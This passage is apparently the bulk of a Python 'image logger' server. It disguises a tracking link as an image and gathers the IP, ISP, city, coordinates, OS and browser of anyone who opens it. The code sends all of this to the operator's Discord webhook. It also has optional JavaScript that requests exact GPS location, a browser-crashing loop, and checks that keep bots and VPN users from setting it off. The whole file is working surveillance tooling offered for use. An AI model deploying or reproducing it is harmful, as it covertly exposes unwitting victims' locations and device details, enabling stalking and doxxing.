vtBf5cmtMe9vYml0t8a+94/jLWjg2X+NYqyfoyOZTrDlSUxcUdPq1rRf/4DMwdoYoYzCnB4IISgM6o/C5iqyKNgNyingMc/siMYu3c2iDH8a01Z+op9HmsHcDga7F2pSjWrq8cKJWwJfFcks2WzU2dVEGbY7DNKNYubnra6xjMU6x9wmC9EDbpsE+zj2Lt3GB7Jt33RVqU6RPl2TNpi2LtEOMKqDX1ovRq2mjeArVRORH2GsR6J1VlvYA42KM0fpYlSxBu0DQFv4pdcHAXdRICFR5GJWapl8U0Ay+vxdj0Iq83E1dcL0vD2hF4kVZ6rMF4qhwcy0fQkDqCgVtrlOK6qo0Dij6phZQGR4WHDaRDpJfFUbtqSBVwp8Oe2iwB6WX4y/gRj0Omkh5RvZqcsrfVVmqTbtcLFM7KW6qeGiOEcqI395RZtN4CNRXDmZWjWDsPVfiINDBWRi3TLAytfMqNYu1wgn3ZAGGKTCBatzUrv8PU+wv3YfvequuW332sXe9NB73112LtoorO73zwN7S/aeTZv1xLd1KQ5FKr9WZrTv9r+Q7zHa4xIc+DWfSbdA5anXkG+Sj0I0BSmMP9wjh0dJ6B7EN/K8qbdidasM4udQmFOgi4EVv7txfkOvsp6nZZg7t/NwI1HF6Yp15/40YOQVyndFtGk9q31hbGLncfIKlAXY0ArbvDDyJKhfbuqiBz/Q26j+CEOdD5ci07PkVBpzxku20fsvnohlAItBGX1hHQdrskGuqVAfSMEej60ZqKyKfKPX/jSjXBXO1KHTwmWYYAc6YNSku/w0z1wbEY1RZuUSBwl5dhodrCVhRBna9B3zZ3ygiJmHO2htooyjJKnu9XBiXb3ourqEOzC6g4lWMqcRf5HQ5xeDtUkd9Cxjrg3eJtkrT3mMqlcCTL0jRmfp7rtuuz3lK79UHI78CYs0pofAApVeFo1ZPWc8oQhAiWHOKNR6+eQJ18RA6Y3W4bFXH+HNoVE6zI4nmuDgjttbqduuDfrsXWQO+uRdbLseRdB4+dHc/cLBvBMDB4B4TBigutpVuXqrM0cyKSZQavLawj7x6Rn32DIlTMxqJhWSKZqKBYc+dUW5jLMofp4Bg81i5VlID7ywK/4fv0qg3qMcp32GGM8drCslaiR8I6df5ih2VtYarEPzai2sJcluHwuYBxDJbuSmRjLDDv8pzQDK8tvAEdvmpidhOYte/pBgtCnpf3aG8EwVCLSdxflqC3F1SiRA1vbzcz8Al6gOXu2ziCtR8V+Kt2qLYGjmd4NR08d8QtkGscGcsFkdQiql6c12/3/0yP79niCa/7QbWFV7F2vrDcFl+PtSvWKPU2wWsLT64RSIyn1QoF/1e7UnFwLEGlBIcMRft4FWuHyoacNom2XuU21u7C1E9uhSd5rXGV6pTvMIpqCzc37tUWLleRmogLcannzePbWDv74LypZXlt4Xzl1s87lLWTyH0sJW/rMd7WFl75eVHb3Bw01ZWf14TJIiqXR7F2uBSJtmp16JZ6R4MoIZUnjuBN5H1XMVTQqyEpDbHIUK8bXAn1cASwVgWPGG4Fgf9VMHHVU23hargmU23hFW2DKaRl82BZr6Z3Km5PFEa/XDPldZ4R4NbjPOo1jCu4DSs7wqnorw2U7DI+4dhU00zWBef0wtVFirW7khB+U23hKPsecSvVFi6YuL7F4ZoklsDe4OVC8NYspQmyWSfanoq1uGKmlvEJV6acsGWNagsHqky1hQV6Ex9uYirHSJ5nl9M2NajuematYQ3dwOQU7KtiiWoLK1Ft4eKpIUgmZw84e7DMA4gsulemtg1XkReYqZn8aYUe0HnkLMmfalAdNKF4Aq0FJyFVxJnID4tJrVrrG/JR/6Yt/+4xmPWmg4inH9YWfn9JtrvvPvXz76ulXkeZ72fCmTcHTcWN9+Fm9t59rJ11R7bJdw4X9N5syP5umdVUW9jl1qLyErzNHlrs1J3XknfG8gC4vmj6AuqyxG975Our7gRiJS4vUhDugG6O1kzzdpHEpVVt4fuNrWLtUD/tq4NcCxVOW6kBQ2ZX2UBcR7F2j/OSAfqA81vHHMalxa2tiavSugFO9bVu8TqNWweakSzrvzGP5a4hBru9N7JXIl2vor9iy+LJ2AQiz4Nn1JaV25NtVYWvtZbCdgSehklOlSHbcer6yX5Klg48kz8kHmtnnsRl5UJWBsvawhlm1Fa1hWkqCJhQmIm9atF3NXqB2Kq2MI8bt40j0EfcF1lQJcicQkuSDiYUfRrwXbGsLewaIYjFRY/qNjd3we1s8NrC7ai2MAXGU21hZxVrR7WFu7zuR0s3KdYupYmPC836qrZwhBOuUOBQ3PhA0gONQ94ZPtKGhF3zuPEsCuz0WoRocfaFE5XjhEI9GSBwbPjceV48rdA7NoKBzCaiihoM3VumOIw861lOY28g60Xzdm3OlDXTay5oaT6sLXw0jt5JxmPtlrWFixEGK1CUlpSoTiT7otdEfNtXNB8BiYBgqSHN9gjfUm1h1r61TugHlm8gNlnjRYDpSCA5lzrVmbnz884MkHeNerUreuGjM9jPxAZOCMVLqi3cNscRvkU0p92rLdw7chFPI23rq1i7aydcLGPtNpf49uuxdmmbagsv7mEwbqiEyMZ4h8Gcx8VLqcHXMK/+IoFHGKxppgmDnTdBykcLvMho7+NJp2/cKm8xZlfGDe7GHyvOJcXatRajgm7BJFzVFsbfzzRnuPShl6eVVN7QAGf+SGUI2yDlI3vACYtN42qhc71syjqzBeX1moDY5lxnJclSwDstyaGSuqI8HQtG+erybYPkS+hPm+s9pqeUZrOlo4polmK+ynEpM/T4gPmgX0BVHx3TCFGeTkFl+6plQv5kzkKxxPN0Quhgt9w3sdLLsmyRdY0u9/MaIhFhFsqPveYobvI8nUz7dIiIiuuhx4suOO4OIGfqWnUaobcknxxm2yddC2FW3uhC0TqYnISZLg7Wq0In5AYwzxqyemjexihwhZibz7OFfRDo5a11nifVGkVMqr/U4vdhI8XLu7c6oyS0NyG7zy/lLcdLQZDiH1kYhNFoh4wDy/wyshVkOxlh3llP729neX5ZNO6tGu5upjo44HwdYp3IGkEtmeEX4OpbGjs6oxK3J0T5ZTR8upOAeqckdLZTPL+MVmrUbbCKg8l29lPQ2UnlcqnA316TkU2TxxqV1/VeFGvX2Yd557YqMt597nZAmuDyFZI51Ms69VQu1eK/pl91MjRYsgDJURSnm0tt5Dpvcf0V3kf8/ffZ+lkQNjfvRJvwfl6Bmn6L2tB+H+kW31ah9n/Q7oVr7n4LTvh6q795kX23V9x21S0qoQF3sXaHD22KdvO1YWaqzmsLexIBAD6HchcxmLnVk7rgcr8DfpRibBUURzXrijrKu7MHPYUUa8cN+zMNckyFtIOyWBrxYk2dFMyGVFv4oC1Ffof5NgrZueDc6ZQ4/ESnFyg+6NaKagvTS2ZHy9rC37Idx1Q4hPsTeIFGnFFxGp1xo4QOTil4TdejUr5eVLepLb0hnz1DlV8lznzHijJ3MyGvLcy0TC+qLTw7sSAwpni3O45Mb2FExqrm7OZ+TG7sTQyf2xjJJkS1hcvVSciuAQmwsawtHOWcEvOXM6rQjmoLZ6eII7Tk2MhxLxnw2hQ5cPY9Y0S1hcsssjFaVHZZB3l80qfawijLtltqr0a1hbksKxpDYFsqtBFvaIxyTmOOtNmi9GSql4PQIHrx7SHCIqqfoOhHeZ0/mWONcXo4Kn+0daQtnwRQvkPhRLu1MRZxgu0j3knx9AhQcOVFVulHhtF1kNO2wddlHxRe0kZhR+erN03OFuWzSY3bJajux3m4rC3sXBe1qErPYocq4t6v+0GxdvtiimLtalZUWxiRai/kft7byr9Oyal0z6jux0YaZN+9sFEhoJoqFq/7YSns2u4/qC0c00Ds6gWqa9ds8NrCapcX0KXawtpkWS5v3zLO95Z1P5zQqllRbWHsNsnrfkS1hcnE8/XawoQTIl8kOeYGzZOcdhXV/TBpeL5uCYOxCIM5YtcZBkMW2Wo4BhMBcYIrGdWkKw4pCKBViFIlInuex201t8wooxfOiizy87LJWQyhxyOqV7ML/eQq1u78Gsr65Hrp581RteqODNOeMQm9GnwAMz2qLTydq7NqvkaxdgiieG1hHNNZh8bQHu0hmjte4HIU01SvprkBFBSXX9aDuYCsPMdFzHamczY+KvLawmpUW3gwkq6qDV5b2K7BeOENl/VqcHhequVwAUpd3uD1anaRobxeWxgaCJ3n65y2FyqvLbzhXDijREqZnBFthUUyrUWvdZtpGVDrGYEK2oj+5NLz3cjGKIgJEAZEW8futsAV/WMzBfOEAm0NWVdySVuWSJm33J3je75Ccx7eELk2gyHdTDtyNlOwGRXxLDahU+AJ8m1d3465CEiMNFhLHWSeyyJ0SrJElMWBD1nvcrrRW2UTvMsCK8VsdjFzuzniYPlmGmIjmETgXpChoOv0LjygLZ1fcq/COnkU08b20tcuMIqXwZNRnSUafsbmQsD8rNFd53WWDAq6h0n2ru4xxbAaWzHWLdTr7UD3Y93uKOOGEHN9KEavey6y5kzXI6aMt5pipVvnPk0wHgmgspFtsLBQL034C8KR7+gsV9a3KVoor3MNsI4nC+wteQ3j76vMW/zdV0p7ozd7kgOhUrkTSVffkPzxQ/uh/dB+aD+0H9oP7Yf2Q/uh/dC+tZW7YEuo0CzVrjcWCMp+3RWaWV2eDldfX8tG+JdtM3cfJlY9hvo9WYJIa0Wtz6tGalw+hFaTK1Bjq0t/9XsWtCoRGcMhBIu5gJcXqz53qngh5PGXpDYWQ971v1hzFVFU6F/0jqGCBIOCDucStwT19+B8bxvK0QvOikYdlDq3lTq+mZntQaMZPFb70ftXtV38VRJ21a2ZuQF4sry3DmMxwTs5w19GPqKxqUTjie8+q//vuwWVAehxnUKqiLb0yrTeYOfwDLf7LkXTxRZRBTg7K+0KEuQvir7tRuu2YSaOz6BtDA7Woqg0aA9KZJ6LSzxdgLKj/6VboOspJ27E2ck+1VAKToZ9Wd2IKU0yC7cUBkFUhZfqGAUnteJF8cIzudGqLeup+CAsi8wHpoN1Es40bYtiJ+yTYVzRs5b8/krN/kO34M5s1fQX33DhD+07t3tuy3733Ydy/TO31l/qSp+8Zgf+C353v4LdN18uPMwU9d7Kr2d/pwnP7gn0ZC7p07kSZOsISOu5SSjkqDJKPkxDP6IFvdEx188i1dP06ujCrrC9uSG06d0DKR4dQ6+OHq8izoJTWL7mHrZz27zOY30DaIROTkjAJn919Lq8ulw6y+91OUPOlBCt0OvR12M6bNCro8dGFO1n8spMsEGRIyvDd8HIUVRFcn07vXxU5ROfhk+Zi1Tvg3Vw9Y1sfzct1L+zH/2vbgQHqAAEfx/6ZQo1BsfonodyKc9UkPe2xwtupE8NtMy4ao4mrHKu0Zutuo8WiiywM/Cmo5gpJSe6vqm6q3J+wLvlNJF1c6zqWzbzUzrzWwMfzLg6U9lj21jFH4q96vmyAt/AVslf2dBCgdnDgqof4Aj8DHbOHONwUAFPWq1UOuktQFbFrh05aIC8envASxsTIGQlVZd8ZnxLvvTfoJGK0OCyvxxSTZUBef/OB+QGNektt7EKL4xHGUVUejd02flwfDRzm4+OQhsQnRFA8x6DbKj1BUV9Lvvd46/vpGY9Bt3Q9yWqIms3yWnOqLqzMzRhVcNn4Cu45/m6ZbA3CwcbLAGCIiHkYP4yJh5pyyGgpe323VW4Nw0f18AoWt1pJXIah10a3lbLSNvNvrpmGj3LqhvvvzSEdernTwxeV3AgXjBDSTqqf15jfkMdIkLt9pnC46ry5v74pCRUbfW8dn40MZRH1xUnqZ+U1nAdNcwOueX10ITla0m8D4a9U8YjcigMg+JqtWFGNTL96l66dQozuQl2pQrnJ/xyRzXKvsRJM2BGQ1IvikolxhpGX6oAjUBNN5DURtJRHvcMBfqn/CCdDE5HrBH6duQFLFT3cPjaYVXabp+ooOtDVgwt2obvu+VSqUwuqiNqZ6KXJ22QxpQCCqzLJam4Im+JTDqXvS2Mf1tKYhMPpRN0ErkxD7lzL5bd5rK5De7ETWE/SQrGS1JgWjaR4OmXVBE2tyrAgOOmQeCX0xvzcghEcjRSEjJ0eeL2IooKxPui4ctL0YYnc7nI4MFvnI+Aw0M6A5nc5m01+8z3Wtk38/6Z/Zva25ON/wnaCvrsPwy+ewi35pHsTn2HGtpvFSa7b8Vi//hvz7V4yaNVu3XZy3eHsnBbLOW2LQPeim+Alg0xBEfk8asTieoowLk4OECJk9JFmKicec50DYoSQgGxRNlpodLN6IPoxapNmCFvzNPLZc+bcT3K/7PUTHnRpHLE/0BN1Rft0yY4J1HMm2jOvSkSQD4g9GCZ+3apOLSoVLJKJzsNZdhiiBmKtQ8Xonpsmhc98ajQXLsfoJij9IE2Z6Ra/QR4uVqdkEYa2EE2emTsYHJp8iCtGrQY5KiovcPZgTdMZIFtpDjk2shOorxCrQmTvS7kh8S4YqqIQOItlfr+jlrgJ2kNHi5z//JWF2fcG55fEjl6arimMcrfJUqzhuW3XR2osrUOj5phICWKF9XmFLSQ73d7EEkmqsLDuMph1vjbF2jRU1QdobjotRFlSbz02AnE9ARP6XUfw3EkyBV8Kj1xgyoJ0XusZvzGJtoxYjhWUvgrI+KGF+zb7O9e13aRDlIneRXVzGZe0J1Vd3rDyWWRMh+8IyCwZJboRSosHxarE/VKSBHUbwAABLZJREFUV0u9GiAGs4Oae+F0+wTeqXmMA2VPqoMYrlNlND2UYTzdIsxsH0Br0E125lrucIpqFy7fniEotQ3KG3eMOrj4fMQuNOW93ZF74Wl1em9cLL/Ixk5waTeahZG+Yau0CeKGFXTaefbWSf2dNHoh3yxMLBlnvV/Y6IXd1lZrnZZgsVunuGDfWlCg2Lxf2J349cL61dzOQqqOqqY/2o7hmn34HshGxYJKpQPtOcSQxPlwhNpoDJdrv2Jv9yslSPsgWAmKUctWKnWyqVkVn2usvXV6+WSavBqVYRZv4SoMdyjcr12DVIhMIEtRiEK9UMgVw38K43qg/WB6fXet9d2R9u5d+uT6A/D2b//+19/PP2T78PnrR9ae4H9fvKSvuRc3P8YP4b9/cnsy/uTelZNX93/3+89XXz/6xf0TP/3ZiriF1982c35x/xUX/2Ttw+eTl4e/fgkf/fwpfHnzi/HNy/iTw5vyR5/C77+8GX9efHp+cwPPf/kRvPiIyLz25Oc3s5uPspObT/HIs/jNS9IdPrl5+fLPT38LH3360U/w5CdPOW1/9e+whh//6z//61f05/DoQji6hIvhJXSvbyuZ9tW1t1Qb+CdoHz756ie/fvmnz5/8/Mnh85sf/ekPz3/x5Onn8MUr+Pjz5588ffrRj794/tnzp7/53bMvnv7u5ubnT/70v9fcjz/96ubJn59/8uzLZ1/95oubmy9e3TyDX/8Gfv/sBbgf/wa+4kv4//z0Z/9Bnz/9T/5xDWcQu4Za6TJ1neS09UwV5PzfqV37HbQPkVg3f/jq8yeTJz+3v/rDr199+vMnv/8DfPEUPv70+YuXH9386dXz3z7/8umf//vFq+NGd+3Jl3/44ulXv/nqD58+Qtp+8ezTX7Qbv/ji5iXS9iXQD5999RK++jTq/P/y//7fz/5In7e0Xb/MXQ9XpotG9Xt68dR7aMcvZy/hy0/hkxcv4y9epq6+fBG7ib/s3dx89vHN52s3Xz6d3Fg/HsDNj9wbklXxG+HLH9989tkh/uSLF8gXXv4Ij/7uc+tF/ubmJ7+/+dEjPPnJzUc/uhvhVz/948/p8/r6QLg8299PjLLd69tCNlRY8V+wDX78jjr6VSTK7iCwcHZ0+baLf2g/tL+49R5a/9jXlEl79Y1s42UfgruXZZWbaWiHvMYv1HiF4n5zC2I1yof55+Wlf0nLNljiSu4AKrqQj0qrXUnQsiw/zkaHlSh/rKdBrqHD+UY7w6adOOO+Ppio3ATRLYuC7hy16wp4J5C0F9DFr8EUZmf/1Gbub28pcSbB5BoU0NqVCA+5pyMYjIZs3SwbhsOvMqGgFc68g+CAzFKHIrdtDbaivLvZGa/8Sy9qN4GXDz7UiPhXTHn3han+kVrOQGKUr4GBuiZylyStW3LAKmCWj8LIFi1Bobm25x3YBx8ibZeBeBnGLYozBoXp+Exw129pm6H3jexBiuqh/Cu3zEDsXCmLrQCaMV3j6/bQgFTVh7ZSeVTzPTpSnBqzgVIa66wUU8I4q46oXrcbJQWbZhNcaTOo6pCfGjE2HbEFQ55QSWn/4oGLuTtPTZvZZ2+9rvDGKnE/tL+0rX+3qhY/tG9u/z8Ko5u1YUcLEgAAAABJRU5ErkJggg==", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
